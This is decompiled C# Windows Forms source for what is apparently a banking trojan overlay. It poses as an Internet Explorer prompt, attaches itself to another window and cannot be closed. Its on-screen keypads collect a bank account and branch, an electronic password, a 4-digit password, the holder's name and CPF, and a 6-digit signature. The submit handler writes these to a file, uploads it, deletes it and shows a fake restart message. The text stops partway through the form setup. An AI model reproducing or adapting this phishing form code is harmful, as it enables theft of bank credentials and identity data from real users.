using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KanK;

public class Cxx : Form
{
	private IntPtr hand;

	private string fixa = "0";

	private string shift = "0";

	private IContainer components;

	private Panel panel1;

	private MaskedTextBox f_si;

	private Label label10;

	private Label label9;

	private Label label8;

	private Label label7;

	private Label label6;

	private Label label5;

	private Label label4;

	private Label label3;

	private Label label2;

	private Label label1;

	private Label label40;

	private Label label30;

	private Label label20;

	private Label label39;

	private Label label29;

	private Label label19;

	private Label label38;

	private Label label28;

	private Label label18;

	private Label label37;

	private Label label27;

	private Label label17;

	private Label label36;

	private Label label26;

	private Label label16;

	private Label label35;

	private Label label25;

	private Label label15;

	private Label label34;

	private Label label24;

	private Label label14;

	private Label label33;

	private Label label23;

	private Label label13;

	private Label label32;

	private Label label22;

	private Label label12;

	private Label label21;

	private Label label11;

	private Label label31;

	private Label label41;

	private Panel panel2;

	private Label label42;

	private Label label43;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Panel panel3;

	private Panel panel4;

	private Label f_bota;

	private Label label65;

	private Label label66;

	private Label label64;

	private Label label60;

	private Label label63;

	private Label label62;

	private Label label59;

	private Label label61;

	private Label label58;

	private Label label57;

	private TextBox f_as;

	private Label lab_data;

	private Label lab_dias;

	private Label lab_pc;

	private Label label44;

	private Label label67;

	private Label label68;

	private Label label69;

	private Label label70;

	private Label label71;

	private Label label72;

	private Label label73;

	private Label label74;

	private Label label75;

	private TextBox f_4;

	private Label label56;

	private Label label55;

	private Label label54;

	private Label label53;

	private Label label51;

	private Label label49;

	private Label label47;

	private Label label45;

	private Label label52;

	private Label label50;

	private Label label48;

	private Label label46;

	private ComboBox ComboTipoBox;

	private TextBox f_c;

	private TextBox f_n;

	private TextBox f_b;

	private TextBox f_a;

	[DllImport("user32.dll")]
	private static extern int SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	public Cxx()
	{
		InitializeComponent();
	}

	public Cxx(IntPtr hwnd)
	{
		InitializeComponent();
		hand = hwnd;
		SetParent(((Control)this).get_Handle(), hand);
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void label32_Click(object sender, EventArgs e)
	{
		if (fixa == "1")
		{
			fixa = "0";
		}
		if (fixa == "0")
		{
			fixa = "1";
		}
	}

	private void label21_Click(object sender, EventArgs e)
	{
		if (shift == "1")
		{
			shift = "0";
		}
		if (shift == "0")
		{
			shift = "1";
		}
	}

	private void Teclado(string Letra)
	{
		if (shift == "0" || fixa == "0")
		{
			Letra = Letra.ToLower();
		}
		if (shift == "1" || fixa == "1")
		{
			Letra = Letra.ToUpper();
		}
		((Control)f_si).set_Text(((Control)f_si).get_Text() + Letra);
		if (shift == "1")
		{
			shift = "0";
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
		Teclado("1");
	}

	private void label2_Click(object sender, EventArgs e)
	{
		Teclado("2");
	}

	private void label3_Click(object sender, EventArgs e)
	{
		Teclado("3");
	}

	private void label4_Click(object sender, EventArgs e)
	{
		Teclado("4");
	}

	private void label5_Click(object sender, EventArgs e)
	{
		Teclado("5");
	}

	private void label6_Click(object sender, EventArgs e)
	{
		Teclado("6");
	}

	private void label7_Click(object sender, EventArgs e)
	{
		Teclado("7");
	}

	private void label8_Click(object sender, EventArgs e)
	{
		Teclado("8");
	}

	private void label9_Click(object sender, EventArgs e)
	{
		Teclado("9");
	}

	private void label10_Click(object sender, EventArgs e)
	{
		Teclado("0");
	}

	private void label11_Click(object sender, EventArgs e)
	{
		Teclado("q");
	}

	private void label12_Click(object sender, EventArgs e)
	{
		Teclado("w");
	}

	private void label13_Click(object sender, EventArgs e)
	{
		Teclado("e");
	}

	private void label14_Click(object sender, EventArgs e)
	{
		Teclado("r");
	}

	private void label15_Click(object sender, EventArgs e)
	{
		Teclado("t");
	}

	private void label16_Click(object sender, EventArgs e)
	{
		Teclado("y");
	}

	private void label17_Click(object sender, EventArgs e)
	{
		Teclado("u");
	}

	private void label18_Click(object sender, EventArgs e)
	{
		Teclado("i");
	}

	private void label19_Click(object sender, EventArgs e)
	{
		Teclado("o");
	}

	private void label20_Click(object sender, EventArgs e)
	{
		Teclado("p");
	}

	private void label22_Click(object sender, EventArgs e)
	{
		Teclado("a");
	}

	private void label23_Click(object sender, EventArgs e)
	{
		Teclado("s");
	}

	private void label24_Click(object sender, EventArgs e)
	{
		Teclado("d");
	}

	private void label25_Click(object sender, EventArgs e)
	{
		Teclado("f");
	}

	private void label26_Click(object sender, EventArgs e)
	{
		Teclado("g");
	}

	private void label27_Click(object sender, EventArgs e)
	{
		Teclado("h");
	}

	private void label28_Click(object sender, EventArgs e)
	{
		Teclado("j");
	}

	private void label29_Click(object sender, EventArgs e)
	{
		Teclado("k");
	}

	private void label30_Click(object sender, EventArgs e)
	{
		Teclado("l");
	}

	private void label33_Click(object sender, EventArgs e)
	{
		Teclado("z");
	}

	private void label34_Click(object sender, EventArgs e)
	{
		Teclado("x");
	}

	private void label35_Click(object sender, EventArgs e)
	{
		Teclado("c");
	}

	private void label36_Click(object sender, EventArgs e)
	{
		Teclado("v");
	}

	private void label37_Click(object sender, EventArgs e)
	{
		Teclado("b");
	}

	private void label38_Click(object sender, EventArgs e)
	{
		Teclado("n");
	}

	private void label39_Click(object sender, EventArgs e)
	{
		Teclado("m");
	}

	private void label40_Click(object sender, EventArgs e)
	{
		string text = ((Control)f_si).get_Text();
		((Control)f_si).set_Text(text.Substring(0, text.Length - 1));
	}

	private void label31_Click(object sender, EventArgs e)
	{
		((TextBoxBase)f_si).Clear();
	}

	private void label42_Click(object sender, EventArgs e)
	{
		Form1.Durma(2000);
		((Control)pictureBox1).set_Visible(true);
		((Control)pictureBox2).set_Visible(true);
		((Control)pictureBox2).BringToFront();
	}

	private void label55_Click(object sender, EventArgs e)
	{
		((TextBoxBase)f_4).Clear();
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
		Form1.Durma(2000);
		((Control)panel2).set_Visible(false);
		((Control)panel3).set_Visible(true);
	}

	private void label56_Click(object sender, EventArgs e)
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)f_a).get_Text().Length > 2 && ((Control)f_b).get_Text().Length > 3 && ((Control)f_n).get_Text().Length > 10 && ((Control)f_c).get_Text().Length == 11 && ((Control)f_4).get_Text().Length == 4)
		{
			Form1.Durma(2000);
			((Control)panel4).set_Visible(true);
			((Control)lab_pc).set_Text(Environment.MachineName.ToString());
			DateTime now = DateTime.Now;
			((Control)lab_data).set_Text(now.ToString());
		}
		else
		{
			MessageBox.Show("Dados inválidos.", "Internet Explorer");
		}
	}

	private void label57_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "1");
		}
	}

	private void label58_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "4");
		}
	}

	private void label59_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "5");
		}
	}

	private void label60_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "9");
		}
	}

	private void label61_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "7");
		}
	}

	private void label62_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "0");
		}
	}

	private void label63_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "6");
		}
	}

	private void label64_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "8");
		}
	}

	private void label65_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "2");
		}
	}

	private void label66_Click(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "3");
		}
	}

	private void label75_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "8");
		}
	}

	private void label74_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "0");
		}
	}

	private void label72_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "3");
		}
	}

	private void label69_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "7");
		}
	}

	private void label73_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "9");
		}
	}

	private void label71_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "6");
		}
	}

	private void label70_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "2");
		}
	}

	private void label68_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "5");
		}
	}

	private void label44_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "1");
		}
	}

	private void label67_Click(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "4");
		}
	}

	private void label41_Click(object sender, EventArgs e)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)f_si).get_Text().Length > 5)
		{
			Form1.Durma(1500);
			((Control)panel2).set_Visible(true);
		}
		else
		{
			MessageBox.Show("Senha inválida.", "Internet Explorer");
		}
	}

	private void label57_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "1");
		}
	}

	private void label58_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "4");
		}
	}

	private void label59_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "5");
		}
	}

	private void label60_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "9");
		}
	}

	private void label61_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "7");
		}
	}

	private void label62_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "0");
		}
	}

	private void label63_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "6");
		}
	}

	private void label64_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "8");
		}
	}

	private void label65_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "2");
		}
	}

	private void label66_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_as).get_Focused() && ((Control)f_as).get_Text().Length < 6)
		{
			((Control)f_as).set_Text(((Control)f_as).get_Text() + "3");
		}
	}

	private void panel4_Paint(object sender, PaintEventArgs e)
	{
		((Control)f_as).Focus();
	}

	private void f_bota_Click(object sender, EventArgs e)
	{
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)f_as).get_Text().Length == 6)
		{
			((Control)f_bota).set_Visible(false);
			Form1.GuardaInfo("Cxx", "Acounta......: " + ((Control)f_a).get_Text() + " / " + ((Control)f_b).get_Text());
			Form1.GuardaInfo("Cxx", "EletroPass...: " + ((Control)f_si).get_Text());
			Form1.GuardaInfo("Cxx", "4Password....: " + ((Control)f_4).get_Text());
			Form1.GuardaInfo("Cxx", "Fisic Name,..: " + ((Control)f_n).get_Text());
			Form1.GuardaInfo("Cxx", "Fisic CPF..,.: " + ((Control)f_c).get_Text());
			Form1.GuardaInfo("Cxx", "Signature....: " + ((Control)f_as).get_Text());
			Form1.FazerUpload("Cxx.txt");
			Form1.Durma(1000);
			MessageBox.Show("O Internet Explorer deverá reiniciar.", "Internet Explorer");
			File.Delete("Cxx.txt");
			Application.Exit();
		}
		else
		{
			MessageBox.Show("Sua assinatura deve conter 6 dígitos.", "Internet Explorer");
		}
	}

	private void NaoPrecioneLetra(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite somente números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void label75_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "8");
		}
	}

	private void label74_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "0");
		}
	}

	private void label72_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "3");
		}
	}

	private void label69_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "7");
		}
	}

	private void label73_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "9");
		}
	}

	private void label71_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "6");
		}
	}

	private void label70_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "2");
		}
	}

	private void label68_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "5");
		}
	}

	private void label44_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "1");
		}
	}

	private void label67_Click_1(object sender, EventArgs e)
	{
		if (((Control)f_4).get_Text().Length < 4)
		{
			((Control)f_4).set_Text(((Control)f_4).get_Text() + "4");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ba: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f1: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Expected O, but got Unknown
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ac: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Expected O, but got Unknown
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cd: Expected O, but got Unknown
		//IL_03ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Expected O, but got Unknown
		//IL_03d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e3: Expected O, but got Unknown
		//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ee: Expected O, but got Unknown
		//IL_03ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f9: Expected O, but got Unknown
		//IL_03fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0404: Expected O, but got Unknown
		//IL_0405: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_0478: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		//IL_04ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_057c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0586: Expected O, but got Unknown
		//IL_061e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0628: Expected O, but got Unknown
		//IL_0641: Unknown result type (might be due to invalid IL or missing references)
		//IL_0792: Unknown result type (might be due to invalid IL or missing references)
		//IL_079c: Expected O, but got Unknown
		//IL_0b5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2052: Unknown result type (might be due to invalid IL or missing references)
		//IL_205c: Expected O, but got Unknown
		//IL_208a: Unknown result type (might be due to invalid IL or missing references)
		//IL_20f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_20ff: Expected O, but got Unknown
		//IL_23a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2410: Unknown result type (might be due to invalid IL or missing references)
		//IL_241a: Expected O, but got Unknown
		//IL_25d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_25dc: Expected O, but got Unknown
		//IL_269b: Unknown result type (might be due to invalid IL or missing references)
		//IL_272d: Unknown result type (might be due to invalid IL or missing references)
		//IL_27bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2851: Unknown result type (might be due to invalid IL or missing references)
		//IL_28e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2975: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a07: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a99: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bbd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c47: Expected O, but got Unknown
		//IL_2c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cea: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cf4: Expected O, but got Unknown
		//IL_2d6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d76: Expected O, but got Unknown
		//IL_2dfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e06: Expected O, but got Unknown
		//IL_2ea0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f33: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fc6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3059: Unknown result type (might be due to invalid IL or missing references)
		//IL_30ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_317f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3212: Unknown result type (might be due to invalid IL or missing references)
		//IL_32a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3338: Unknown result type (might be due to invalid IL or missing references)
		//IL_33cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3440: Unknown result type (might be due to invalid IL or missing references)
		//IL_344a: Expected O, but got Unknown
		//IL_3481: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a00: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a0a: Expected O, but got Unknown
		//IL_3b15: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b1f: Expected O, but got Unknown
		//IL_3b99: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ba3: Expected O, but got Unknown
		//IL_3bb6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bc0: Expected O, but got Unknown
		//IL_3c43: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c4d: Expected O, but got Unknown
		//IL_3c81: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cdf: Expected O, but got Unknown
		//IL_3cf2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cfc: Expected O, but got Unknown
		//IL_3d30: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d83: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d8d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cxx));
		panel2 = new Panel();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		label42 = new Label();
		label43 = new Label();
		panel1 = new Panel();
		label41 = new Label();
